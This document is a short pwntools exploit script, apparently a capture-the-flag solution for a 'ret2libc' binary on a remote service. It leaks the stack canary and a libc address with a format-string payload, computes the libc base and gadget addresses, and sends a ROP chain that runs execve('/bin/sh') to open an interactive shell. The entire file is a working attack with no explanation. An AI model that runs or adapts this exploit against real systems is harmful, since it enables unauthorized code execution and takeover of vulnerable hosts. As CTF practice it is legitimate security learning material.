from pwn import *

# r = process('./ret2libc', env={"LD_PRELOAD" : "./libc.so.6"})
r = remote('172.31.210.1', 50002)

print(r.recvline())
payload = b'%p' * 14 + b'^'
r.sendline(payload)
stack_info = r.recvuntil(b'^')[:-1].replace(b'(nil)', b'0xdeadbeef').split(b'0x')
canary = int(stack_info[-4], 16)


libc_main = int(stack_info[-2], 16)
libc_base = libc_main - 0x24083# 0x29d90

log.info(f'{stack_info}')
log.info(f'{hex(libc_main)}')
log.info(f'{hex(libc_base)}')
log.info(f'{hex(canary)}')

pop_rax_ret = libc_base + 0x0000000000036174# 0x0000000000045eb0# : pop rax ; ret
pop_rdi_ret = libc_base + 0x0000000000023b6a# 0x000000000002a3e5# : pop rdi ; ret
pop_rsi_ret = libc_base + 0x000000000002601f# 0x000000000002be51# : pop rsi ; ret
pop_rdx_rbx_ret = libc_base + 0x0000000000015fae6# 0x00000000000904a9# : pop rdx ; pop rbx ; ret
bin_sh = libc_base + 0x00000000001b45bd# 0x00000000001d8678# : /bin/sh
syscall_ret = libc_base + 0x000000000002284d# 0x0000000000091316# : 


r.sendline(b'a' * 0x28 + p64(canary) + p64(1) + p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_rbx_ret) + p64(0) + p64(0) + p64(syscall_ret))

r.interactive()